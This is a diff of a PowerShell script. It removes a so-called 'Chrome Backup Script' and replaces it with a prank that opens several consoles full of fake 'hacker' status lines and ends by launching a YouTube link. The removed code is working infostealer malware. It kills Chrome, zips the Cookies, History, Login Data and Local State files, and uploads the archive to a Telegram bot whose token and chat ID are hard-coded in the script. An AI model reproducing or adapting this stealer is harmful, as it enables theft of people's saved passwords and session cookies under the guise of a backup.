@@ -1,86 +1,80 @@
-$botToken = "8529187820:AAGN2vlcmLBtf-EaZKWfkR9ufRrVOssQMKo"  
-$chatId = "8121448802"   
+# ===============================
+#  Multi-Window Popup Showcase
+# ===============================
 
-$localAppData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-$timestamp = (Get-Date).ToString('yyyyMMdd_HHmmss')
-$zipPath = "$env:TEMP\ChromeBackup_$timestamp.zip"
+$ErrorActionPreference = "SilentlyContinue"
 
-Write-Host "==== Chrome Backup Script Started ====" -ForegroundColor Cyan
+$yt = "https://www.youtube.com/watch?v=YOUR_VIDEO_ID"
 
-Write-Host "[1/3] Terminating Chrome processes..." -ForegroundColor Yellow
-Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 1
-
-Write-Host "[2/3] Compressing Chrome data..." -ForegroundColor Yellow
-
-if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
-
-$filesToBackup = @(
-    "$localAppData\Default\Cookies",
-    "$localAppData\Default\History",
-    "$localAppData\Default\Bookmarks",
-    "$localAppData\Default\Login Data",
-    "$localAppData\Local State"
-)
-
-$validFiles = $filesToBackup | Where-Object { Test-Path $_ }
-
-if ($validFiles.Count -eq 0) {
-    Write-Error "Chrome data files not found or path is incorrect."
-    exit
+function LaunchWindow($title, $lines, $delay=30) {
+    $script = @"
+`$Host.UI.RawUI.WindowTitle = '$title'
+Clear-Host
+foreach (`$l in @($($lines | ForEach-Object { "'$_'" } -join ","))) {
+    Write-Host `$l
+    Start-Sleep -Milliseconds $delay
+}
+Start-Sleep -Seconds 2
+"@
+    Start-Process powershell -ArgumentList "-NoExit","-ExecutionPolicy Bypass","-Command",$script
 }
 
-try {
-    Compress-Archive -Path $validFiles -DestinationPath $zipPath -Force
-    Write-Host "Backup saved locally at: $zipPath" -ForegroundColor Green
+# 창 1
+LaunchWindow "MODULE INIT" @(
+    "[+] USB interface detected",
+    "[+] Loading runtime",
+    "[+] Allocating memory blocks",
+    "[+] Environment OK"
+) 40
+
+Start-Sleep -Milliseconds 200
+
+# 창 2
+LaunchWindow "PIPELINE" @(
+    "[*] Stage 1 started",
+    "[*] Stage 2 started",
+    "[*] Stage 3 started",
+    "[*] Synchronizing streams"
+) 25
+
+Start-Sleep -Milliseconds 200
+
+# 창 3
+LaunchWindow "STREAM" @(
+    "[>] Buffering output",
+    "[>] Rendering console feed",
+    "[>] Injecting visual layer",
+    "[>] Channel stable"
+) 20
+
+Start-Sleep -Milliseconds 200
+
+# 창 4 (프로그레스 전용)
+$progressScript = @"
+`$Host.UI.RawUI.WindowTitle = 'PROGRESS'
+Clear-Host
+for (`$i=0; `$i -le 100; `$i++) {
+    `$bar = '#' * (`$i/2)
+    `$space = ' ' * (50 - (`$i/2))
+    Write-Host -NoNewline "`r[`$bar`$space] `$i% "
+    Start-Sleep -Milliseconds (Get-Random -Minimum 20 -Maximum 50)
 }
-catch {
-    Write-Error "Compression failed: $_"
-    exit
-}
-Write-Host "[3/3] Uploading file to Telegram..." -ForegroundColor Yellow
+Start-Sleep -Seconds 2
+"@
+Start-Process powershell -ArgumentList "-NoExit","-ExecutionPolicy Bypass","-Command",$progressScript
 
-function Send-TelegramDocument {
-    param (
-        [string]$token,
-        [string]$chat_id,
-        [string]$filePath
-    )
+Start-Sleep -Seconds 3
 
-    $url = "https://api.telegram.org/bot$token/sendDocument"
-    $fileItem = Get-Item $filePath
-    
-    Add-Type -AssemblyName 'System.Net.Http'
-    $client = New-Object System.Net.Http.HttpClient
-    $content = New-Object System.Net.Http.MultipartFormDataContent
-    $fileStream = [System.IO.File]::OpenRead($filePath)
-    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
-    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
-    $content.Add($fileContent, "document", $fileItem.Name)
-    $content.Add((New-Object System.Net.Http.StringContent($chat_id)), "chat_id")
-    $content.Add((New-Object System.Net.Http.StringContent("Chrome Backup Complete! ($timestamp)")), "caption")
-
-    try {
-        $task = $client.PostAsync($url, $content)
-        $task.Wait()
-        $result = $task.Result
-        
-        if ($result.IsSuccessStatusCode) {
-            Write-Host "Upload Successful! Check your Telegram." -ForegroundColor Cyan
-        }
-        else {
-            Write-Error "Upload Failed. Status: $($result.StatusCode)"
-        }
-    }
-    catch {
-        Write-Error "Network Error: $_"
-    }
-    finally {
-        $fileStream.Dispose()
-        $client.Dispose()
-        $content.Dispose()
-    }
-}
-Send-TelegramDocument -token $botToken -chat_id $chatId -filePath $zipPath
-
-Write-Host "==== Process Finished ====" -ForegroundColor Cyan
+# 최종 SUCCESS 창
+$finalScript = @"
+`$Host.UI.RawUI.WindowTitle = 'RESULT'
+Clear-Host
+Write-Host ''
+Write-Host '==============================='
+Write-Host '          SUCCESSFUL           '
+Write-Host '==============================='
+Write-Host ''
+Start-Sleep -Milliseconds 800
+Start-Process '$yt'
+"@
+Start-Process powershell -ArgumentList "-NoExit","-ExecutionPolicy Bypass","-Command",$finalScript
